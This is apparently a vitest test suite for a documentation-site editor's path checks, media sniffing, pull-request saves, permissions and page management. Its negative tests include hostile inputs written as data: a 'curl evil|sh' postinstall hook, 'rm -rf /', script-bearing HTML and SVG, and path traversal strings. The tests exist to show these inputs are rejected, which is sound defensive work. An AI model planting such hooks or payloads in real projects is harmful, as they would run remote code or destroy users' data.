import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { Db } from './db.ts';
import { classifyPath, createEditor, sniffMedia } from './editor.ts';
import { createTestDb } from './testing/pglite.ts';
import { createFixture } from './testing/platform-fixture.ts';

const DOCS_JSON = JSON.stringify({ name: 'Acme', navigation: [{ tab: 'Docs', groups: [{ group: 'Start', pages: ['index', 'guides/auth'] }] }] }, null, 2);
const PNG = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0, 0, 0]);

let db: Db;
beforeAll(async () => (db = await createTestDb()));
afterAll(() => db.close());

async function setup() {
  const f = await createFixture(db);
  const repo = `${f.repo}-e`;
  f.git.seed(repo, {
    'docs.json': DOCS_JSON,
    'docs/index.mdx': '---\ntitle: Home\n---\n\n# Home\n',
    'docs/guides/auth.mdx': '---\ntitle: Auth\n---\n\n# Auth\n',
    'package.json': '{}',
    'next.config.mjs': 'export default {}',
  });
  const { site } = await f.sites.create(f.actor, f.team.id, { name: `Ed ${repo}`, provider: 'github', repo });
  const editor = createEditor({ db, auth: f.auth, sites: f.sites, providers: f.providers, storage: f.storage, clock: f.clock });
  return { f, editor, site, repo };
}

describe('paths and media sniffing', () => {
  it('lets the editor touch docs, docs.json and media only', () => {
    expect(classifyPath('docs.json')).toBe('config');
    expect(classifyPath('docs/guides/auth.mdx')).toBe('doc');
    expect(classifyPath('docs/a.md')).toBe('doc');
    expect(classifyPath('public/media/x.png')).toBe('media');
    for (const bad of ['package.json', 'next.config.mjs', '.github/workflows/x.yml', 'docs/../package.json', 'docs/.hidden.mdx', 'docs/a.js', 'src/app/page.tsx', 'public/x.html', 'public/media/.env', 'docs//a.mdx', '/docs/a.mdx'])
      expect(classifyPath(bad), bad).toBeUndefined();
  });
  it('identifies files by content, not by name', () => {
    expect(sniffMedia(PNG)?.ext).toBe('png');
    expect(sniffMedia(new TextEncoder().encode('<?xml version="1.0"?><svg viewBox="0 0 1 1"></svg>'))?.ext).toBe('svg');
    expect(sniffMedia(new TextEncoder().encode('<html><script>alert(1)</script></html>'))).toBeUndefined();
    expect(sniffMedia(new TextEncoder().encode('#!/bin/sh\nrm -rf /\n'))).toBeUndefined();
    expect(sniffMedia(new Uint8Array(3))).toBeUndefined();
    expect(sniffMedia(new TextEncoder().encode('%PDF-1.7 ......'))?.ext).toBe('pdf');
  });
});

describe('saving edits as commits and pull requests (P5.10)', () => {
  it('opens a PR on a new branch and never touches the default branch', async () => {
    const { f, editor, site, repo } = await setup();
    const { headSha } = await editor.tree(f.actor, site.id);
    const r = await editor.save(f.actor, site.id, { baseSha: headSha, message: 'Improve intro', changes: [{ path: 'docs/index.mdx', content: '---\ntitle: Home\n---\n\n# Welcome\n' }] });
    expect(r.mode).toBe('pr');
    expect(r.branch).toMatch(/^dockudos\/edit-/);
    expect(r.prUrl).toMatch(/\/pull\/1$/);
    expect(f.git.snapshot(repo, 'main')['docs/index.mdx']).toContain('# Home');
    expect(f.git.snapshot(repo, r.branch)['docs/index.mdx']).toContain('# Welcome');
    expect(f.git.pulls[0]).toMatchObject({ head: r.branch, base: 'main', title: 'Improve intro' });
    expect(f.git.pushes.every((p) => p.branch !== 'main')).toBe(true);
    expect((await db.query('SELECT mode, pr_url FROM edits WHERE site_id = $1', [site.id])).rows[0]).toMatchObject({ mode: 'pr' });
  });

  it('commits directly only for admins, with an expected head', async () => {
    const { f, editor, site, repo } = await setup();
    const { headSha } = await editor.tree(f.actor, site.id);
    const r = await editor.save(f.actor, site.id, { baseSha: headSha, message: 'Direct', mode: 'direct', changes: [{ path: 'docs/index.mdx', content: '---\ntitle: Home\n---\n\nDirect\n' }] });
    expect(r).toMatchObject({ mode: 'direct', branch: 'main' });
    expect(f.git.snapshot(repo, 'main')['docs/index.mdx']).toContain('Direct');
    const editorUser = await f.auth.upsertUser({ sub: `ed-${Math.random()}`, email: `ed${Math.random()}@x.test`, roles: [], groups: [] });
    await f.auth.setMember(f.actor, f.team.id, editorUser.email!, 'editor');
    const as = { type: 'user', user: editorUser } as const;
    await expect(editor.save(as, site.id, { baseSha: r.headSha, message: 'x', mode: 'direct', changes: [{ path: 'docs/index.mdx', content: '---\ntitle: H\n---\n' }] })).rejects.toMatchObject({ status: 403 });
    await editor.save(as, site.id, { baseSha: r.headSha, message: 'as editor', changes: [{ path: 'docs/index.mdx', content: '---\ntitle: H\n---\n' }] });
    const viewer = await f.auth.upsertUser({ sub: `vw-${Math.random()}`, email: `vw${Math.random()}@x.test`, roles: [], groups: [] });
    await f.auth.setMember(f.actor, f.team.id, viewer.email!, 'viewer');
    await expect(editor.save({ type: 'user', user: viewer }, site.id, { baseSha: r.headSha, message: 'x', changes: [{ path: 'docs/index.mdx', content: 'x' }] })).rejects.toMatchObject({ status: 403 });
  });

  it('detects edit conflicts and returns the upstream version; identical or unrelated changes are fine', async () => {
    const { f, editor, site, repo } = await setup();
    const { headSha: base } = await editor.tree(f.actor, site.id);
    f.git.push(repo, 'main', { 'docs/index.mdx': '---\ntitle: Home\n---\n\nSomeone else changed this\n' });
    const mine = '---\ntitle: Home\n---\n\nMy change\n';
    const err = (await editor.save(f.actor, site.id, { baseSha: base, message: 'mine', changes: [{ path: 'docs/index.mdx', content: mine }] }).catch((e) => e)) as { status: number; code: string; details: { conflicts: { path: string; theirs: string }[]; headSha: string } };
    expect(err).toMatchObject({ status: 409, code: 'edit_conflict' });
    expect(err.details.conflicts).toEqual([{ path: 'docs/index.mdx', theirs: '---\ntitle: Home\n---\n\nSomeone else changed this\n' }]);
    expect(f.git.pulls).toHaveLength(0);
    // Retrying against the new head, with the merged text, succeeds.
    await editor.save(f.actor, site.id, { baseSha: err.details.headSha, message: 'merged', changes: [{ path: 'docs/index.mdx', content: mine }] });
    // A change to a file nobody else touched is fine even though the head moved.
    f.git.push(repo, 'main', { 'docs/other.mdx': '---\ntitle: O\n---\n' });
    await editor.save(f.actor, site.id, { baseSha: err.details.headSha, message: 'unrelated', changes: [{ path: 'docs/guides/auth.mdx', content: '---\ntitle: Auth2\n---\n' }] });
    // Making the same edit as upstream is not a conflict.
    const up = '---\ntitle: Same\n---\n';
    const head = f.git.push(repo, 'main', { 'docs/guides/auth.mdx': up });
    await editor.save(f.actor, site.id, { baseSha: err.details.headSha, message: 'same', changes: [{ path: 'docs/guides/auth.mdx', content: up }] });
    void head;
  });

  it('refuses paths outside the editable set, bad front matter, bad docs.json and empty saves, naming each problem', async () => {
    const { f, editor, site } = await setup();
    const { headSha } = await editor.tree(f.actor, site.id);
    const save = (changes: { path: string; content?: string; delete?: boolean }[], extra = {}) => editor.save(f.actor, site.id, { baseSha: headSha, message: 'm', changes, ...extra });
    await expect(save([{ path: 'package.json', content: '{"scripts":{"postinstall":"curl evil|sh"}}' }])).rejects.toThrow('can change docs.json');
    await expect(save([{ path: '.github/workflows/x.yml', content: 'x' }])).rejects.toMatchObject({ status: 400 });
    await expect(save([{ path: 'docs/a.mdx', content: '---\ntitle: [unclosed\n---\n' }])).rejects.toMatchObject({ status: 400, code: 'invalid_content' });
    await expect(save([{ path: 'docs.json', content: '{ nope' }])).rejects.toThrow('not valid JSON');
    await expect(save([{ path: 'docs.json', content: '{"name":"A","bogusKey":1}' }])).rejects.toThrow('bogusKey');
    await expect(save([{ path: 'docs.json', delete: true }])).rejects.toThrow('cannot be deleted');
    await expect(save([{ path: 'docs/a.mdx', content: 'x'.repeat(1024 * 1024 + 1) }])).rejects.toThrow('larger than 1 MB');
    await expect(save([])).rejects.toThrow('Nothing to save');
    await expect(save([{ path: 'docs/a.mdx', content: '---\ntitle: A\n---\n' }, { path: 'docs/a.mdx', content: 'x' }])).rejects.toThrow('twice');
    await expect(save([{ path: 'docs/a.mdx', content: '---\ntitle: A\n---\n' }], { message: ' ' })).rejects.toThrow('commit message');
    expect(f.git.pulls).toHaveLength(0);
  });

  it('warns, without blocking, when the sidebar names a missing page', async () => {
    const { f, editor, site } = await setup();
    const { headSha } = await editor.tree(f.actor, site.id);
    const cfg = JSON.stringify({ name: 'Acme', navigation: [{ tab: 'Docs', groups: [{ group: 'Start', pages: ['index', 'ghost'] }] }] });
    const r = await editor.save(f.actor, site.id, { baseSha: headSha, message: 'nav', changes: [{ path: 'docs.json', content: cfg }] });
    expect(r.warnings).toEqual(['docs.json lists "ghost" but no page file exists for it']);
  });
});

describe('reading and listing', () => {
  it('lists editable files only and reads text files', async () => {
    const { f, editor, site } = await setup();
    const tree = await editor.tree(f.actor, site.id);
    expect(tree.files.map((x) => x.path)).toEqual(['docs.json', 'docs/guides/auth.mdx', 'docs/index.mdx']);
    expect((await editor.read(f.actor, site.id, 'docs/index.mdx')).content).toContain('# Home');
    await expect(editor.read(f.actor, site.id, 'package.json')).rejects.toMatchObject({ status: 400 });
    await expect(editor.read(f.actor, site.id, 'docs/missing.mdx')).rejects.toMatchObject({ status: 404 });
    const stranger = await f.auth.upsertUser({ sub: `rd-${Math.random()}`, email: `rd${Math.random()}@x.test`, roles: [], groups: [] });
    await expect(editor.tree({ type: 'user', user: stranger }, site.id)).rejects.toMatchObject({ status: 403 });
  });

  it('respects a docs folder inside a monorepo', async () => {
    const f = await createFixture(db);
    const repo = `${f.repo}-mono`;
    f.git.seed(repo, { 'README.md': 'x', 'site/docs.json': DOCS_JSON, 'site/docs/index.mdx': '---\ntitle: H\n---\n' });
    const { site } = await f.sites.create(f.actor, f.team.id, { name: 'Mono', provider: 'github', repo, docsDir: 'site' });
    const editor = createEditor({ db, auth: f.auth, sites: f.sites, providers: f.providers, storage: f.storage, clock: f.clock });
    const tree = await editor.tree(f.actor, site.id);
    expect(tree.files.map((x) => x.path)).toEqual(['docs.json', 'docs/index.mdx']);
    const r = await editor.save(f.actor, site.id, { baseSha: tree.headSha, message: 'm', changes: [{ path: 'docs/index.mdx', content: '---\ntitle: H2\n---\n' }] });
    expect(f.git.snapshot(repo, r.branch)['site/docs/index.mdx']).toContain('H2');
  });
});

describe('media (P5.11)', () => {
  it('stages an upload and commits it with the page', async () => {
    const { f, editor, site, repo } = await setup();
    const up = await editor.uploadMedia(f.actor, site.id, 'My Diagram.PNG', PNG);
    expect(up.path).toMatch(/^\/media\/[0-9a-f]{8}-my-diagram\.png$/);
    expect(up.markdown).toBe(`![my-diagram](${up.path})`);
    const { headSha } = await editor.tree(f.actor, site.id);
    const r = await editor.save(f.actor, site.id, { baseSha: headSha, message: 'add image', uploads: [up.id], changes: [{ path: 'docs/index.mdx', content: `---\ntitle: H\n---\n\n![x](${up.path})\n` }] });
    expect(Object.keys(f.git.snapshot(repo, r.branch)).some((p) => p === `public${up.path}`)).toBe(true);
  });

  it('refuses unknown types, oversize files, hostile SVGs and foreign upload ids', async () => {
    const { f, editor, site } = await setup();
    await expect(editor.uploadMedia(f.actor, site.id, 'evil.png', new TextEncoder().encode('<html><script>alert(1)</script></html>'))).rejects.toThrow('Unsupported');
    await expect(editor.uploadMedia(f.actor, site.id, 'big.png', new Uint8Array(10 * 1024 * 1024 + 1))).rejects.toThrow('10 MB');
    const svg = await editor.uploadMedia(f.actor, site.id, 'logo.svg', new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><script>alert(1)</script><path d="M0 0h10v10z" onclick="x()"/></svg>'));
    const stored = new TextDecoder().decode(await f.storage.get([...f.storage.objects.keys()].find((k) => k.endsWith(`${svg.path.slice(7)}`))!));
    expect(stored).not.toMatch(/script|onclick/i);
    expect(stored).toContain('<path');
    await expect(editor.save(f.actor, site.id, { baseSha: 'x', message: 'm', uploads: ['00000000-0000-0000-0000-000000000000'], changes: [] })).rejects.toThrow('Unknown upload');
  });
});

describe('page management (P5.11)', () => {
  const apply = async (s: Awaited<ReturnType<typeof setup>>, op: Parameters<ReturnType<typeof createEditor>['planPage']>[2]) => {
    const { changes } = await s.editor.planPage(s.f.actor, s.site.id, op);
    const { headSha } = await s.editor.tree(s.f.actor, s.site.id);
    const r = await s.editor.save(s.f.actor, s.site.id, { baseSha: headSha, message: op.type, changes });
    return { changes, snap: s.f.git.snapshot(s.repo, r.branch), warnings: r.warnings };
  };

  it('creates a page and lists it in the sidebar', async () => {
    const s = await setup();
    const { snap, warnings } = await apply(s, { type: 'create', id: 'guides/webhooks', title: 'Webhooks: "quoted"', group: 'Start' });
    expect(snap['docs/guides/webhooks.mdx']).toBe('---\ntitle: "Webhooks: \\"quoted\\""\n---\n\n# Webhooks: "quoted"\n\n');
    expect(JSON.parse(snap['docs.json']!).navigation[0].groups[0].pages).toEqual(['index', 'guides/auth', 'guides/webhooks']);
    expect(warnings).toEqual([]);
  });

  it('renames a page, updates the sidebar and leaves a permanent redirect', async () => {
    const s = await setup();
    const { snap } = await apply(s, { type: 'rename', from: 'guides/auth', to: 'guides/authentication' });
    expect(snap['docs/guides/auth.mdx']).toBeUndefined();
    expect(snap['docs/guides/authentication.mdx']).toContain('title: Auth');
    const cfg = JSON.parse(snap['docs.json']!);
    expect(cfg.navigation[0].groups[0].pages).toEqual(['index', 'guides/authentication']);
    expect(cfg.redirects).toEqual([{ source: '/guides/auth', destination: '/guides/authentication', permanent: true }]);
  });

  it('deletes a page and its sidebar entry', async () => {
    const s = await setup();
    const { snap, warnings } = await apply(s, { type: 'delete', id: 'guides/auth' });
    expect(snap['docs/guides/auth.mdx']).toBeUndefined();
    expect(JSON.parse(snap['docs.json']!).navigation[0].groups[0].pages).toEqual(['index']);
    expect(warnings).toEqual([]);
  });

  it('rejects bad ids, duplicates and missing pages', async () => {
    const s = await setup();
    const plan = (op: Parameters<typeof s.editor.planPage>[2]) => s.editor.planPage(s.f.actor, s.site.id, op);
    await expect(plan({ type: 'create', id: '../etc', title: 'x' })).rejects.toMatchObject({ status: 400 });
    await expect(plan({ type: 'create', id: 'Upper', title: 'x' })).rejects.toMatchObject({ status: 400 });
    await expect(plan({ type: 'create', id: 'index', title: 'x' })).rejects.toMatchObject({ status: 409 });
    await expect(plan({ type: 'create', id: 'ok', title: 'a\nb' })).rejects.toMatchObject({ status: 400 });
    await expect(plan({ type: 'delete', id: 'nope' })).rejects.toMatchObject({ status: 404 });
    await expect(plan({ type: 'rename', from: 'nope', to: 'x' })).rejects.toMatchObject({ status: 404 });
    await expect(plan({ type: 'rename', from: 'index', to: 'guides/auth' })).rejects.toMatchObject({ status: 409 });
  });
});

describe('docs.json form validation', () => {
  it('reports every problem with the key it is about', async () => {
    const { f, editor, site } = await setup();
    expect(await editor.validateConfig(f.actor, site.id, DOCS_JSON)).toEqual({ ok: true });
    const bad = await editor.validateConfig(f.actor, site.id, '{"name":"A","navigation":"nope","extra":1}');
    expect(bad.ok).toBe(false);
    expect((bad as { problems: string[] }).problems.join('\n')).toMatch(/navigation/);
    expect((bad as { problems: string[] }).problems.join('\n')).toMatch(/extra/);
    expect(await editor.validateConfig(f.actor, site.id, '{')).toMatchObject({ ok: false });
  });
});
